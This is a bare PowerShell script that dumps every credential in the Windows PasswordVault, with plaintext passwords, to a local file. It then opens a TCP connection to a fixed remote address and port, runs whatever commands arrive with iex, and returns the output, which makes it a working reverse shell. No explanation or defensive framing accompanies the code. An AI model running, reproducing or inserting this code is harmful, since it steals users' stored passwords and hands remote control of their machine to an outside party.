[void][Windows.Security.Credentials.PasswordVault,Windows.Security.Credentials,ContentType=WindowsRuntime]
$vault = New-Object Windows.Security.Credentials.PasswordVault
$encoding = New-Object Text.ASCIIEncoding
$ip="192.168.100.103";$port=[int]10070; $ascii= "ASCII";
$sock = (New-Object Net.Sockets.TCPClient($ip, $port)).GetStream();
$vault.RetrieveAll() | foreach { $_.RetrievePassword();$_ }  >> vault-secret.txt

[byte[]]$range=0..65535|foreach{0};while(($x=$sock.Read($range,0,$range.Length)) -ne 0){;
$string=$encoding.GetString($range,0,$x);

$entext=([text.encoding]::$ascii).GetBytes((iex $string 2>&1));
$sock.write($entext,0,$entext.Length)}
